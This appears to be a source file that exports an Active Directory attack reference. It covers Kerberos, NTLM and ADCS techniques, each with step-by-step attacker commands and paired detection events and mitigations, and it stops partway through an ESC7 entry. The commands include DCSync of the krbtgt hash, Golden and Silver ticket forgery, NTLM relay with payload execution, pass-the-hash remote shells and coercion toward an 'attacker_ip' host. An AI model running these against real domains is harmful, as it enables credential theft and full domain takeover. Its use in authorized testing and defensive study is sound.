// Copyright (c) 2026 SpartanKing18. All rights reserved.
// Active Directory Attack Techniques — Comprehensive Reference
// For authorized security assessments and education only.

export const AD_ATTACK_CATEGORIES = [
  "Kerberos Attacks",
  "NTLM Attacks",
  "LDAP Attacks",
  "ADCS Attacks",
  "Group Policy Attacks",
  "Trust Attacks",
  "Persistence",
  "Enumeration",
  "Lateral Movement",
  "Privilege Escalation"
];

export const KERBEROS_ATTACKS = [
  {
    id: "kerb-001",
    name: "AS-REP Roasting",
    category: "Kerberos Attacks",
    description: "Targets accounts with Kerberos pre-authentication disabled (DONT_REQUIRE_PREAUTH). The attacker requests a TGT for these accounts and receives an AS-REP encrypted with the user's password hash, which can be cracked offline.",
    prerequisites: ["Valid domain user account or anonymous LDAP access", "Target accounts with UF_DONT_REQUIRE_PREAUTH set"],
    tools: ["Rubeus", "Impacket (GetNPUsers.py)", "Hashcat", "John the Ripper"],
    steps: [
      { step: 1, command: "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth", description: "Enumerate accounts with pre-auth disabled (PowerShell)" },
      { step: 2, command: "impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip 10.10.10.1", description: "Request AS-REP hashes with Impacket (no creds needed if users known)" },
      { step: 3, command: "impacket-GetNPUsers domain.local/lowpriv:Password1 -request -format hashcat -outputfile asrep.txt", description: "Request AS-REP hashes with valid creds (enumerates automatically)" },
      { step: 4, command: "Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt", description: "AS-REP Roast with Rubeus from domain-joined machine" },
      { step: 5, command: "hashcat -m 18200 asrep.txt wordlist.txt -r rules/best64.rule", description: "Crack AS-REP hashes (Hashcat mode 18200)" },
      { step: 6, command: "john --wordlist=wordlist.txt --format=krb5asrep asrep.txt", description: "Crack with John the Ripper" }
    ],
    detection: [
      "Event ID 4768 with Result Code 0x0 and Encryption Type 0x17 (RC4) for accounts that normally use AES",
      "Unusual volume of AS-REQ requests from a single source",
      "Monitor for accounts with pre-auth disabled via Event ID 4738"
    ],
    mitigations: [
      "Enable Kerberos pre-authentication for all accounts",
      "Use strong, long passwords (20+ characters) for service accounts",
      "Monitor for accounts with DONT_REQUIRE_PREAUTH flag",
      "Implement Managed Service Accounts (gMSA) where possible"
    ]
  },
  {
    id: "kerb-002",
    name: "Kerberoasting",
    category: "Kerberos Attacks",
    description: "Requests Kerberos TGS tickets for accounts with Service Principal Names (SPNs) set. The TGS ticket is encrypted with the service account's NTLM hash, enabling offline password cracking. Any authenticated domain user can request these tickets.",
    prerequisites: ["Valid domain user account (any privilege level)"],
    tools: ["Rubeus", "Impacket (GetUserSPNs.py)", "Hashcat", "John the Ripper", "PowerView"],
    steps: [
      { step: 1, command: "Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName", description: "Enumerate accounts with SPNs" },
      { step: 2, command: "impacket-GetUserSPNs domain.local/user:password -request -dc-ip 10.10.10.1 -outputfile tgs.txt", description: "Request TGS tickets with Impacket" },
      { step: 3, command: "Rubeus.exe kerberoast /outfile:tgs.txt /format:hashcat", description: "Kerberoast with Rubeus" },
      { step: 4, command: "Rubeus.exe kerberoast /rc4opsec /outfile:tgs.txt", description: "OPSEC-safe: only target accounts using RC4 encryption" },
      { step: 5, command: "Rubeus.exe kerberoast /user:svc_sql /outfile:tgs.txt", description: "Target a specific service account" },
      { step: 6, command: "hashcat -m 13100 tgs.txt wordlist.txt -r rules/best64.rule", description: "Crack TGS hashes (Hashcat mode 13100 for RC4, 19700 for AES)" },
      { step: 7, command: "john --wordlist=wordlist.txt --format=krb5tgs tgs.txt", description: "Crack with John" }
    ],
    detection: [
      "Event ID 4769 with Encryption Type 0x17 (RC4) — AES is normal, RC4 is suspicious",
      "High volume of TGS requests from a single user in a short time",
      "Honeypot SPN accounts with detectable passwords that alert on authentication"
    ],
    mitigations: [
      "Use Group Managed Service Accounts (gMSA) — 120-char random passwords, auto-rotated",
      "Set long (30+) complex passwords on all service accounts",
      "Enforce AES encryption for service accounts (avoid RC4 downgrade)",
      "Remove unnecessary SPNs from user accounts",
      "Monitor for Kerberoasting with honeypot SPNs"
    ]
  },
  {
    id: "kerb-003",
    name: "Golden Ticket",
    category: "Kerberos Attacks",
    description: "Forges a Kerberos TGT using the KRBTGT account's NTLM hash, granting the attacker unrestricted access to any resource in the domain. The forged ticket can impersonate any user, including non-existent ones, with any group membership.",
    prerequisites: ["KRBTGT account NTLM hash (requires Domain Admin or DCSync)", "Domain SID", "Domain FQDN"],
    tools: ["Mimikatz", "Impacket (ticketer.py)", "Rubeus"],
    steps: [
      { step: 1, command: "mimikatz # lsadump::dcsync /user:krbtgt", description: "Extract KRBTGT hash via DCSync" },
      { step: 2, command: "mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:<NTLM_HASH> /ptt", description: "Forge and inject Golden Ticket with Mimikatz" },
      { step: 3, command: "mimikatz # kerberos::golden /user:FakeAdmin /domain:domain.local /sid:S-1-5-21-... /krbtgt:<HASH> /id:500 /groups:512,513,518,519,520 /ticket:golden.kirbi", description: "Save Golden Ticket to file with custom RID and groups" },
      { step: 4, command: "impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid S-1-5-21-... -domain domain.local Administrator", description: "Forge Golden Ticket with Impacket" },
      { step: 5, command: "export KRB5CCNAME=Administrator.ccache && impacket-psexec domain.local/Administrator@dc01 -k -no-pass", description: "Use the forged ticket to access the DC" },
      { step: 6, command: "Rubeus.exe golden /rc4:<KRBTGT_HASH> /user:Administrator /domain:domain.local /sid:S-1-5-21-... /ptt", description: "Forge and inject with Rubeus" }
    ],
    detection: [
      "Event ID 4769 where the account name doesn't exist in AD",
      "TGT lifetime exceeding the domain policy maximum (default 10 hours)",
      "Event ID 4672 (Special privileges assigned) for unexpected accounts",
      "Mismatch between account name in TGT and actual AD account properties"
    ],
    mitigations: [
      "Reset KRBTGT password twice (with replication time between resets)",
      "Implement a regular KRBTGT rotation schedule (every 180 days)",
      "Use Protected Users security group for privileged accounts",
      "Deploy Microsoft ATA/Defender for Identity for anomaly detection",
      "Limit Domain Admin usage and implement PAM/PIM"
    ]
  },
  {
    id: "kerb-004",
    name: "Silver Ticket",
    category: "Kerberos Attacks",
    description: "Forges a Kerberos TGS ticket using a service account's NTLM hash, granting access to that specific service without contacting the Domain Controller. Unlike Golden Tickets, Silver Tickets are harder to detect as they don't generate TGT-related events on the DC.",
    prerequisites: ["Target service account NTLM hash", "Service SPN", "Domain SID"],
    tools: ["Mimikatz", "Impacket (ticketer.py)", "Rubeus"],
    steps: [
      { step: 1, command: "mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:sql01.domain.local /service:MSSQLSvc /rc4:<SVC_HASH> /ptt", description: "Forge Silver Ticket for MSSQL service" },
      { step: 2, command: "mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:dc01.domain.local /service:cifs /rc4:<MACHINE_HASH> /ptt", description: "Forge Silver Ticket for CIFS (file shares)" },
      { step: 3, command: "mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:dc01.domain.local /service:ldap /rc4:<MACHINE_HASH> /ptt", description: "Forge Silver Ticket for LDAP (DCSync via Silver Ticket)" },
      { step: 4, command: "impacket-ticketer -nthash <SVC_HASH> -domain-sid S-1-5-21-... -domain domain.local -spn MSSQLSvc/sql01.domain.local Administrator", description: "Forge with Impacket" }
    ],
    detection: [
      "Event ID 4624 (Logon) without a corresponding 4768 (TGT Request) on the DC",
      "PAC validation failures when KDC validation is enabled",
      "Anomalous service access patterns"
    ],
    mitigations: [
      "Enable PAC validation on services",
      "Use gMSA for service accounts (auto-rotating passwords)",
      "Monitor for logon events without corresponding TGT requests",
      "Rotate service account passwords regularly"
    ]
  },
  {
    id: "kerb-005",
    name: "Diamond Ticket",
    category: "Kerberos Attacks",
    description: "A stealthier variant of the Golden Ticket. Instead of forging a TGT from scratch, it requests a legitimate TGT and then modifies it using the KRBTGT key, making it appear as a genuine ticket with legitimate timestamps and metadata.",
    prerequisites: ["KRBTGT AES256 key", "Valid domain credentials"],
    tools: ["Rubeus"],
    steps: [
      { step: 1, command: "Rubeus.exe diamond /krbkey:<KRBTGT_AES256> /user:lowpriv /password:Password1 /enctype:aes /domain:domain.local /dc:dc01.domain.local /ticketuser:Administrator /ticketuserid:500 /groups:512 /ptt", description: "Request legitimate TGT, then modify PAC to impersonate Administrator" }
    ],
    detection: [
      "Harder to detect than Golden Tickets — the TGT request is legitimate",
      "PAC contains groups the user shouldn't have",
      "Compare PAC contents with actual AD group memberships"
    ],
    mitigations: [
      "Same as Golden Ticket mitigations",
      "Rotate KRBTGT AES keys regularly",
      "Deploy advanced Kerberos monitoring"
    ]
  },
  {
    id: "kerb-006",
    name: "Pass-the-Ticket (PtT)",
    category: "Kerberos Attacks",
    description: "Steals and reuses existing Kerberos tickets (TGT or TGS) from memory to authenticate as the ticket owner without knowing their password.",
    prerequisites: ["Local admin on a machine with cached tickets"],
    tools: ["Mimikatz", "Rubeus"],
    steps: [
      { step: 1, command: "mimikatz # sekurlsa::tickets /export", description: "Export all Kerberos tickets from memory" },
      { step: 2, command: "mimikatz # kerberos::ptt ticket.kirbi", description: "Inject a stolen ticket into the current session" },
      { step: 3, command: "Rubeus.exe dump /luid:0x3e7 /nowrap", description: "Dump tickets for a specific logon session" },
      { step: 4, command: "Rubeus.exe ptt /ticket:<BASE64_TICKET>", description: "Inject ticket with Rubeus" },
      { step: 5, command: "Rubeus.exe triage", description: "List all accessible tickets in current logon sessions" }
    ],
    detection: [
      "Event ID 4768/4769 from unexpected source IPs",
      "Same ticket used from different IP addresses",
      "Logon events from IPs that don't match the ticket's original source"
    ],
    mitigations: [
      "Enforce Credential Guard on Windows 10/11 and Server 2016+",
      "Use Protected Users group for sensitive accounts",
      "Minimize ticket lifetimes",
      "Implement network segmentation"
    ]
  },
  {
    id: "kerb-007",
    name: "Overpass-the-Hash / Pass-the-Key",
    category: "Kerberos Attacks",
    description: "Uses a stolen NTLM hash or AES key to request a legitimate Kerberos TGT, converting an NTLM hash into a Kerberos ticket. This bypasses NTLM-blocking policies since the actual authentication uses Kerberos.",
    prerequisites: ["Target user's NTLM hash or AES key"],
    tools: ["Mimikatz", "Rubeus", "Impacket"],
    steps: [
      { step: 1, command: "mimikatz # sekurlsa::pth /user:admin /domain:domain.local /ntlm:<HASH> /run:cmd.exe", description: "Overpass-the-Hash with Mimikatz — starts cmd with Kerberos TGT" },
      { step: 2, command: "Rubeus.exe asktgt /user:admin /rc4:<NTLM_HASH> /ptt", description: "Request TGT using NTLM hash with Rubeus" },
      { step: 3, command: "Rubeus.exe asktgt /user:admin /aes256:<AES_KEY> /ptt /opsec", description: "Request TGT using AES key (stealthier)" },
      { step: 4, command: "impacket-getTGT domain.local/admin -hashes :NTLM_HASH", description: "Get TGT with Impacket" }
    ],
    detection: [
      "Event ID 4768 with RC4 encryption when the account normally uses AES",
      "TGT requests from unexpected machines for privileged accounts",
      "Anomalous logon patterns"
    ],
    mitigations: [
      "Enable Credential Guard",
      "Enforce AES-only Kerberos encryption",
      "Monitor for downgrade attacks (AES to RC4)",
      "Use Protected Users group"
    ]
  },
  {
    id: "kerb-008",
    name: "Unconstrained Delegation Abuse",
    category: "Kerberos Attacks",
    description: "Machines configured for unconstrained delegation cache the TGT of any user that authenticates to them. An attacker controlling such a machine can steal these TGTs and impersonate any user who connects, including Domain Admins.",
    prerequisites: ["Admin access on a machine with unconstrained delegation", "Ability to coerce authentication from a high-value target"],
    tools: ["Rubeus", "Mimikatz", "SpoolSample", "PetitPotam"],
    steps: [
      { step: 1, command: "Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation", description: "Find computers with unconstrained delegation" },
      { step: 2, command: "Rubeus.exe monitor /interval:5 /nowrap", description: "Monitor for incoming TGTs on the compromised machine" },
      { step: 3, command: "SpoolSample.exe dc01.domain.local compromised01.domain.local", description: "Coerce DC to authenticate to compromised machine (Printer Bug)" },
      { step: 4, command: "Rubeus.exe ptt /ticket:<DC_TGT>", description: "Inject the captured DC TGT" },
      { step: 5, command: "mimikatz # lsadump::dcsync /user:krbtgt", description: "DCSync using the DC's TGT" }
    ],
    detection: [
      "Monitor for TGT requests forwarded to non-DC machines",
      "Alert on authentication coercion (SpoolSample, PetitPotam)",
      "Event ID 4624 Type 10 on delegation-enabled machines"
    ],
    mitigations: [
      "Remove unconstrained delegation where possible — use constrained or RBCD instead",
      "Add sensitive accounts to Protected Users group (prevents delegation)",
      "Set 'Account is sensitive and cannot be delegated' flag on privileged accounts",
      "Disable the Print Spooler service on DCs"
    ]
  },
  {
    id: "kerb-009",
    name: "Constrained Delegation Abuse (S4U2Self/S4U2Proxy)",
    category: "Kerberos Attacks",
    description: "Exploits constrained delegation by using S4U2Self to obtain a service ticket impersonating any user, then S4U2Proxy to forward that ticket to the allowed service. If the account has TRUSTED_TO_AUTH_FOR_DELEGATION, S4U2Self works for any user.",
    prerequisites: ["Compromise of an account with constrained delegation configured"],
    tools: ["Rubeus", "Impacket (getST.py)"],
    steps: [
      { step: 1, command: "Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne '$null'} -Properties msDS-AllowedToDelegateTo", description: "Find users with constrained delegation" },
      { step: 2, command: "Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne '$null'} -Properties msDS-AllowedToDelegateTo", description: "Find computers with constrained delegation" },
      { step: 3, command: "Rubeus.exe s4u /user:svc_web /rc4:<HASH> /impersonateuser:Administrator /msdsspn:cifs/fileserver.domain.local /ptt", description: "Full S4U attack chain with Rubeus" },
      { step: 4, command: "impacket-getST -spn cifs/fileserver.domain.local -impersonate Administrator domain.local/svc_web -hashes :NTLM_HASH", description: "S4U with Impacket" },
      { step: 5, command: "Rubeus.exe s4u /user:svc_web /rc4:<HASH> /impersonateuser:Administrator /msdsspn:cifs/fileserver.domain.local /altservice:ldap /ptt", description: "Alternative service name abuse — request CIFS ticket but use for LDAP" }
    ],
    detection: [
      "Event ID 4769 with Transited Services field populated",
      "S4U2Self/S4U2Proxy ticket requests for sensitive accounts",
      "Service ticket requests from unexpected principals"
    ],
    mitigations: [
      "Use Resource-Based Constrained Delegation instead where possible",
      "Mark sensitive accounts as 'Cannot be delegated'",
      "Minimize the number of accounts with delegation privileges",
      "Monitor delegation configurations for changes"
    ]
  },
  {
    id: "kerb-010",
    name: "Resource-Based Constrained Delegation (RBCD) Abuse",
    category: "Kerberos Attacks",
    description: "Abuses the ability to write to the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on a target computer. If an attacker controls an account with an SPN (or creates a machine account), they can configure RBCD on the target and then impersonate any user to that target.",
    prerequisites: ["Write access to msDS-AllowedToActOnBehalfOfOtherIdentity on target computer", "Control of an account with an SPN (or MachineAccountQuota > 0 to create one)"],
    tools: ["Rubeus", "Impacket", "PowerView", "StandIn"],
    steps: [
      { step: 1, command: "impacket-addcomputer domain.local/user:pass -computer-name FAKE01$ -computer-pass Password123", description: "Create a machine account (requires MachineAccountQuota > 0)" },
      { step: 2, command: "Set-ADComputer target01 -PrincipalsAllowedToDelegateToAccount FAKE01$", description: "Set RBCD on target (PowerShell AD module)" },
      { step: 3, command: "impacket-getST -spn cifs/target01.domain.local -impersonate Administrator domain.local/FAKE01$:Password123", description: "Request impersonated service ticket via S4U" },
      { step: 4, command: "export KRB5CCNAME=Administrator.ccache && impacket-psexec domain.local/Administrator@target01 -k -no-pass", description: "Use the ticket to get a shell" }
    ],
    detection: [
      "Monitor changes to msDS-AllowedToActOnBehalfOfOtherIdentity (Event ID 5136)",
      "New computer account creation (Event ID 4741)",
      "S4U2Proxy requests from newly created machine accounts"
    ],
    mitigations: [
      "Set MachineAccountQuota to 0",
      "Monitor and alert on RBCD attribute changes",
      "Restrict who can modify computer object attributes",
      "Use AdminSDHolder to protect sensitive objects"
    ]
  }
];

export const NTLM_ATTACKS = [
  {
    id: "ntlm-001",
    name: "NTLM Relay",
    category: "NTLM Attacks",
    description: "Intercepts NTLM authentication and relays it to another service, authenticating as the victim. The attacker positions themselves between the client and server, forwarding the NTLM challenge-response to a target of their choice.",
    prerequisites: ["Man-in-the-middle position or ability to coerce authentication", "Target service without NTLM signing enforcement"],
    tools: ["Impacket (ntlmrelayx.py)", "Responder", "mitm6"],
    steps: [
      { step: 1, command: "responder -I eth0 -wrf --lm", description: "Poison LLMNR/NBT-NS/mDNS to capture NTLM hashes" },
      { step: 2, command: "impacket-ntlmrelayx -tf targets.txt -smb2support", description: "Relay captured NTLM auth to SMB targets (dumps SAM)" },
      { step: 3, command: "impacket-ntlmrelayx -t ldaps://dc01.domain.local --delegate-access", description: "Relay to LDAPS and configure RBCD for privilege escalation" },
      { step: 4, command: "impacket-ntlmrelayx -t ldaps://dc01.domain.local --escalate-user lowpriv", description: "Relay to LDAPS and grant DCSync rights to a user" },
      { step: 5, command: "impacket-ntlmrelayx -t http://adcs01.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController", description: "Relay to ADCS web enrollment to request a certificate" },
      { step: 6, command: "impacket-ntlmrelayx -tf targets.txt -smb2support -e payload.exe", description: "Relay and execute a payload on the target" },
      { step: 7, command: "impacket-ntlmrelayx -tf targets.txt -smb2support -c 'whoami /all'", description: "Relay and execute a command" }
    ],
    detection: [
      "Event ID 4624 Type 3 (Network Logon) from unexpected source IPs",
      "NTLM authentication from a machine that should be using Kerberos",
      "Multiple failed NTLM authentications followed by success from different IP"
    ],
    mitigations: [
      "Enforce SMB signing on all machines",
      "Enforce LDAP signing and channel binding",
      "Disable NTLM where possible (Kerberos only)",
      "Enable Extended Protection for Authentication (EPA)",
      "Disable LLMNR, NBT-NS, and mDNS via GPO"
    ]
  },
  {
    id: "ntlm-002",
    name: "NTLM Coercion — PetitPotam",
    category: "NTLM Attacks",
    description: "Abuses the MS-EFSRPC (Encrypting File System Remote Protocol) to coerce a target machine to authenticate to an attacker-controlled host. Commonly used to force Domain Controllers to authenticate, enabling relay to ADCS or LDAP for full domain compromise.",
    prerequisites: ["Network access to target machine's MS-EFSRPC endpoint", "Relay infrastructure set up"],
    tools: ["PetitPotam (Python)", "Impacket (ntlmrelayx.py)"],
    steps: [
      { step: 1, command: "impacket-ntlmrelayx -t http://adcs01/certsrv/certfnsh.asp -smb2support --adcs --template DomainController", description: "Set up relay to ADCS" },
      { step: 2, command: "python3 PetitPotam.py attacker_ip dc01.domain.local", description: "Coerce DC to authenticate (unauthenticated)" },
      { step: 3, command: "python3 PetitPotam.py -u user -p pass -d domain.local attacker_ip dc01.domain.local", description: "Coerce DC to authenticate (authenticated)" }
    ],
    detection: [
      "Named pipe access to \\\\pipe\\\\efsrpc or \\\\pipe\\\\lsarpc",
      "EFS-related RPC calls from unexpected sources",
      "DC authenticating to non-DC machines via NTLM"
    ],
    mitigations: [
      "Apply Microsoft patches (KB5005413 and later)",
      "Disable the EFS service if not needed",
      "Enable Extended Protection for Authentication on ADCS",
      "Enforce NTLM relay protections (signing, channel binding)"
    ]
  },
  {
    id: "ntlm-003",
    name: "NTLM Coercion — PrinterBug (SpoolSample)",
    category: "NTLM Attacks",
    description: "Abuses the MS-RPRN (Print System Remote Protocol) to coerce a target to authenticate to an attacker-controlled host. The Print Spooler service on the target is asked to send a notification to the attacker, triggering NTLM authentication.",
    prerequisites: ["Valid domain credentials", "Print Spooler service running on target"],
    tools: ["SpoolSample", "Dementor.py", "printerbug.py"],
    steps: [
      { step: 1, command: "SpoolSample.exe dc01.domain.local attacker.domain.local", description: "Trigger PrinterBug from Windows" },
      { step: 2, command: "python3 dementor.py -d domain.local -u user -p pass attacker_ip dc01.domain.local", description: "Trigger PrinterBug with Dementor" },
      { step: 3, command: "python3 printerbug.py domain.local/user:pass@dc01.domain.local attacker_ip", description: "Trigger with printerbug.py (Impacket-based)" }
    ],
    detection: [
      "RPC calls to the Spooler service from unusual sources",
      "DC authenticating outbound via NTLM to non-DC hosts"
    ],
    mitigations: [
      "Disable Print Spooler service on DCs and sensitive servers",
      "Block outbound NTLM from DCs via GPO",
      "Network segmentation to prevent DC from reaching attacker hosts"
    ]
  },
  {
    id: "ntlm-004",
    name: "NTLM Coercion — DFSCoerce",
    category: "NTLM Attacks",
    description: "Abuses the MS-DFSNM (Distributed File System Namespace Management) protocol to coerce NTLM authentication from a target machine.",
    prerequisites: ["Valid domain credentials"],
    tools: ["DFSCoerce"],
    steps: [
      { step: 1, command: "python3 DFSCoerce.py -u user -p pass -d domain.local attacker_ip dc01.domain.local", description: "Coerce DC authentication via DFS" }
    ],
    detection: ["Monitor for DFS-related RPC calls from unexpected sources", "DC authenticating outbound via NTLM"],
    mitigations: ["Apply Microsoft security patches", "Disable NTLM where possible", "Network segmentation"]
  },
  {
    id: "ntlm-005",
    name: "NTLM Coercion — ShadowCoerce",
    category: "NTLM Attacks",
    description: "Abuses the MS-FSRVP (File Server Remote VSS Protocol) to coerce NTLM authentication. Targets the VSS Agent service on file servers and Domain Controllers.",
    prerequisites: ["Valid domain credentials", "FSRVP service running on target"],
    tools: ["ShadowCoerce"],
    steps: [
      { step: 1, command: "python3 ShadowCoerce.py -u user -p pass -d domain.local attacker_ip dc01.domain.local", description: "Coerce authentication via VSS" }
    ],
    detection: ["Monitor for FSRVP RPC calls", "Unexpected outbound NTLM from servers"],
    mitigations: ["Disable FSRVP service if not needed", "Apply patches", "Enable NTLM relay protections"]
  },
  {
    id: "ntlm-006",
    name: "Pass-the-Hash (PtH)",
    category: "NTLM Attacks",
    description: "Uses a stolen NTLM hash to authenticate directly without knowing the plaintext password. Works because NTLM authentication uses the hash directly, not the password.",
    prerequisites: ["Target user's NTLM hash", "Target service accepting NTLM authentication"],
    tools: ["Mimikatz", "Impacket (psexec/wmiexec/smbexec)", "CrackMapExec/NetExec", "Evil-WinRM"],
    steps: [
      { step: 1, command: "mimikatz # sekurlsa::pth /user:admin /domain:domain.local /ntlm:<HASH> /run:cmd.exe", description: "PtH with Mimikatz — spawns cmd as target user" },
      { step: 2, command: "impacket-psexec domain.local/admin@target -hashes :NTLM_HASH", description: "PtH remote shell with PsExec" },
      { step: 3, command: "impacket-wmiexec domain.local/admin@target -hashes :NTLM_HASH", description: "PtH remote shell with WMI (stealthier)" },
      { step: 4, command: "impacket-smbexec domain.local/admin@target -hashes :NTLM_HASH", description: "PtH remote shell with SMB" },
      { step: 5, command: "nxc smb 10.10.10.0/24 -u admin -H NTLM_HASH --shares", description: "Spray PtH across subnet to find accessible shares" },
      { step: 6, command: "evil-winrm -i target -u admin -H NTLM_HASH", description: "PtH via WinRM" }
    ],
    detection: [
      "Event ID 4624 Type 3 with NTLM authentication from unexpected sources",
      "Unusual lateral movement patterns",
      "Same hash used from multiple machines simultaneously"
    ],
    mitigations: [
      "Enable Credential Guard",
      "Use Protected Users group",
      "Implement LAPS for local admin passwords",
      "Disable NTLM (enforce Kerberos)",
      "Use tiered administration model"
    ]
  }
];

export const ADCS_ATTACKS = [
  {
    id: "adcs-001",
    name: "ESC1 — Misconfigured Certificate Templates (Enrollee Supplies Subject)",
    category: "ADCS Attacks",
    description: "A certificate template allows the enrollee to specify an arbitrary Subject Alternative Name (SAN) in the certificate request. An attacker with enrollment rights can request a certificate as any user, including Domain Admins.",
    prerequisites: ["Enrollment rights on a vulnerable template", "Template has CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag", "Template allows Client Authentication or Smart Card Logon EKU"],
    tools: ["Certipy", "Certify"],
    steps: [
      { step: 1, command: "certipy find -u user@domain.local -p password -dc-ip 10.10.10.1 -vulnerable -stdout", description: "Find vulnerable templates with Certipy" },
      { step: 2, command: "Certify.exe find /vulnerable", description: "Find vulnerable templates with Certify" },
      { step: 3, command: "certipy req -u user@domain.local -p password -ca CORP-CA -template VulnTemplate -upn administrator@domain.local -dc-ip 10.10.10.1", description: "Request certificate as Administrator" },
      { step: 4, command: "certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1", description: "Authenticate using the forged certificate to get TGT + NTLM hash" },
      { step: 5, command: "Certify.exe request /ca:CORP-CA /template:VulnTemplate /altname:administrator", description: "Request with Certify" }
    ],
    detection: [
      "Event ID 4886/4887 — certificate request/issuance with SAN different from requester",
      "Monitor for certificate requests with CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT templates"
    ],
    mitigations: [
      "Remove CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT from templates unless absolutely required",
      "Require CA Manager approval for sensitive templates",
      "Restrict enrollment permissions to necessary groups only",
      "Enable certificate request auditing"
    ]
  },
  {
    id: "adcs-002",
    name: "ESC2 — Misconfigured Certificate Templates (Any Purpose EKU)",
    category: "ADCS Attacks",
    description: "A certificate template has the 'Any Purpose' EKU or no EKU at all, combined with enrollment permissions. Such certificates can be used for any purpose including client authentication, allowing impersonation.",
    prerequisites: ["Enrollment rights on a template with Any Purpose or SubCA EKU"],
    tools: ["Certipy", "Certify"],
    steps: [
      { step: 1, command: "certipy find -u user@domain.local -p pass -vulnerable", description: "Find ESC2 vulnerable templates" },
      { step: 2, command: "certipy req -u user@domain.local -p pass -ca CORP-CA -template VulnTemplate", description: "Request the overly permissive certificate" }
    ],
    detection: ["Monitor for certificate issuance with Any Purpose or no EKU"],
    mitigations: ["Set specific EKUs on all templates", "Remove Any Purpose EKU", "Restrict enrollment"]
  },
  {
    id: "adcs-003",
    name: "ESC3 — Enrollment Agent Templates",
    category: "ADCS Attacks",
    description: "An enrollment agent certificate template allows a user to enroll on behalf of other users. An attacker first obtains an enrollment agent certificate, then uses it to request certificates for any user.",
    prerequisites: ["Enrollment rights on a Certificate Request Agent template", "Another template that allows enrollment agent enrollment"],
    tools: ["Certipy", "Certify"],
    steps: [
      { step: 1, command: "certipy req -u user@domain.local -p pass -ca CORP-CA -template EnrollmentAgent", description: "Step 1: Get enrollment agent certificate" },
      { step: 2, command: "certipy req -u user@domain.local -p pass -ca CORP-CA -template User -on-behalf-of 'domain\\administrator' -pfx enrollment_agent.pfx", description: "Step 2: Request certificate on behalf of Administrator" }
    ],
    detection: ["Monitor for enrollment agent certificate requests", "Certificate requests using on-behalf-of enrollment"],
    mitigations: ["Restrict enrollment agent templates", "Limit who can enroll for enrollment agent certificates", "Require manager approval"]
  },
  {
    id: "adcs-004",
    name: "ESC4 — Vulnerable Certificate Template ACLs",
    category: "ADCS Attacks",
    description: "A user has write permissions (WriteDacl, WriteOwner, WriteProperty) on a certificate template object in AD. The attacker modifies the template to make it vulnerable (e.g., enable ENROLLEE_SUPPLIES_SUBJECT), exploits ESC1, then reverts the template.",
    prerequisites: ["Write access to a certificate template AD object"],
    tools: ["Certipy", "Certify", "PowerView"],
    steps: [
      { step: 1, command: "certipy template -u user@domain.local -p pass -template TargetTemplate -save-old", description: "Save current template config and modify to be vulnerable" },
      { step: 2, command: "certipy req -u user@domain.local -p pass -ca CORP-CA -template TargetTemplate -upn administrator@domain.local", description: "Exploit the now-vulnerable template (ESC1)" },
      { step: 3, command: "certipy template -u user@domain.local -p pass -template TargetTemplate -configuration old-config.json", description: "Restore original template configuration" }
    ],
    detection: ["Event ID 5136 — changes to certificate template objects in AD", "Rapid template modification followed by enrollment"],
    mitigations: ["Audit and restrict write permissions on certificate template objects", "Monitor template changes with alerting"]
  },
  {
    id: "adcs-005",
    name: "ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 on CA",
    category: "ADCS Attacks",
    description: "The EDITF_ATTRIBUTESUBJECTALTNAME2 flag is set on the CA, allowing any enrollee to specify a SAN in any certificate request, regardless of the template configuration. This makes every template potentially vulnerable to ESC1-style attacks.",
    prerequisites: ["The CA has EDITF_ATTRIBUTESUBJECTALTNAME2 enabled"],
    tools: ["Certipy", "Certify"],
    steps: [
      { step: 1, command: "certutil -config 'CA01\\CORP-CA' -getreg policy\\EditFlags", description: "Check if EDITF_ATTRIBUTESUBJECTALTNAME2 is enabled" },
      { step: 2, command: "certipy req -u user@domain.local -p pass -ca CORP-CA -template User -upn administrator@domain.local", description: "Request any template with an arbitrary SAN" }
    ],
    detection: ["Check CA configuration for the flag", "Monitor for SAN in certificate requests"],
    mitigations: ["Remove EDITF_ATTRIBUTESUBJECTALTNAME2: certutil -config 'CA\\Name' -setreg policy\\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2", "Restart the CA service after removal"]
  },
  {
    id: "adcs-006",
    name: "ESC7 — Vulnerable CA ACLs (ManageCA/ManageCertificates)",
    category: "ADCS Attacks",
    description: "A user has ManageCA or ManageCertificates rights on the CA itself. ManageCA allows adding oneself as an officer, enabling certificate approval. ManageCertificates allows approving pending certificate requests.",
    prerequisites: ["ManageCA or ManageCertificates rights on the CA"],
    tools: ["Certipy", "PSPKI"],
    steps: [
      { step: 1, command: "certipy ca -u user@domain.local -p pass -ca CORP-CA -add-officer user", description: "Add yourself as CA officer (ManageCA right)" },
      { step: 2, command: "certipy ca -u user@domain.local -p pass -ca CORP-CA -enable-template SubCA", description: "Enable the SubCA template" },
      { step: 3, command: "certipy req -u user@domain.local -p pass -ca CORP-CA -template SubCA -upn administrator@domain.local", description: "Request SubCA certificate (will be denied)" },
      { step: 4, command: "certipy ca -u user@domain.local -p pass -ca CORP-CA -issue-request <REQUEST_ID>", description: "Approve the pending request (ManageCertificates right)" },
      { step: 5, command: "certipy req -u user@domain.local -p pass -ca CORP-CA -retrieve <REQUEST_ID>", description: "Retrieve the issued certificate" }
    ],
    detection: ["Monitor CA officer additions", "Monitor for SubCA template enablement", "Unusual certificate approval patterns"],
